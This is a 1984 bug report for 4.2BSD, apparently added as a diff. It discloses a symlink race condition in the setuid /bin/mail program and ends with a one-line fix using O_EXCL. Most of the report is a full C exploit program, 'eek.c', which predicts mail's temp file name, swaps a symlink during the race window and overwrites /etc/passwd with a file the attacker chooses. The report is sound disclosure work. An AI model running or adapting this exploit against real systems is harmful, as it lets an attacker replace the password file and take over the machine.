@@ -1,0 +1,126 @@
+Return-Path: <brian@wisc-rsch.arpa>
+Date: Thu, 6 Dec 84 12:14:50 cst
+From: brian@wisc-rsch.arpa (Brian Pinkerton)
+Subject: bug in mail allows anyone to write to any file
+Index: 	bin/mail.c 4.2BSD
+
+Description:
+	if one makes an empty symbolic link of the same name that mail is going
+	to use for its temp file, waits for mail to remove this link, then 
+	recreates it, except this time making it a link to a real file, then
+	the mail will overwrite that file.  since mail usually runs setuid,
+	this means passwd can be compromised.
+
+Repeat-By:
+
+#include	<stdio.h>
+#include	<sys/signal.h>
+#include	<sys/types.h>
+#include	<sys/stat.h>
+#include	<sys/file.h>
+
+/*
+ *  eek.c
+ *
+ *  This program replaces /etc/passwd with the chosen file.
+ *
+ *  Derek Zahn, Dec 5, 1984
+ *
+ */
+
+main(argc,argv)
+int		argc;
+char	*argv[];
+{
+	int	pid;
+	char	cmd[40];
+	char	zilch[80];
+	char	*path;
+	char	*temp = "/tmp/maXXXXX";
+	struct	stat	*buf;
+	char	*rindex(), *getenv(), *malloc(), *gettemp();
+
+	if(argc != 2) {
+		printf("usage: %s newpasswordfile\n", argv[0]);
+		exit(1);
+	}
+
+	buf = (struct stat *) malloc(sizeof (struct stat));
+	if(stat(argv[1], buf) == -1) {
+		printf("Can't find the new password file.\n");
+		exit(1);
+	}
+
+	/*  Move the desired file to the mail spool file.  */
+
+	path = getenv("HOME");
+	sprintf(cmd, "cp %s /usr/spool/mail%s",argv[1],rindex(path,'/'));
+	system(cmd); 
+
+	chdir("/tmp");
+	if(stat("/etc/passwd", buf) == -1) {
+		printf("Panic! No password file!\n");
+		exit(1);
+	}
+
+	/*  Execute /bin/mail to set the stage  */
+
+	if((pid = fork()) == 0) {
+		sleep(5L);
+		freopen("/dev/null","r",stdin);
+		execl("/bin/mail","mail",0);
+	}
+
+	/*  Make the temp file.  It will have the same name as the  */
+	/*  one chosen by mail.  It must be a symbolic link to a    */
+	/*  nonexistant file because this way mktemp() will think   */
+	/*  that it does not exist and mail will blindly choose the */
+	/*  same name for its temp file.                            */
+
+	temp = gettemp(temp, pid);
+	sprintf(zilch, "%s/zilch", path);
+	unlink(zilch);
+	symlink(zilch, temp);
+
+	/*  Wait until mail blows away our decoy temp file.  There  */
+	/*  is a very brief period of time between when the file is */
+	/*  removed (for housecleaning purposes) and the slot is    */
+	/*  actually used by mail.                                  */
+
+	while(lstat(temp, buf) != -1) ;
+
+	/*  During this brief time, insert a symbolic link to the   */
+	/*  password file.  Mail will stupidly write through it,    */
+	/*  voila!  New password file.                              */
+
+	symlink("/etc/passwd", temp);
+}
+/* :-) */
+
+/*  This mimics mktemp() except that we pass it the pid of the process  */
+/*  we are trying to fool and it will return exactly what mktemp() will */
+/*  give the real McCoy.                                                */
+
+char *gettemp(as,pid)
+char *as;
+int	 pid;
+{
+	register char *s;
+	register i;
+
+	s = as; while (*s++); s--;
+	while (*--s == 'X') {
+		*s = (pid%10) + '0';
+		pid /= 10;
+	}
+	s++; i = 'a';
+	while (access(as, 0) != -1) {
+		if (i=='z') return("/");
+		*s = i++;
+	}
+	return(as);
+}
+
+Fix:
+	make mail create the temp file with O_EXCL|O_CREATE so if the thing
+	exists, mail can gracefully decline to do the dirty work.
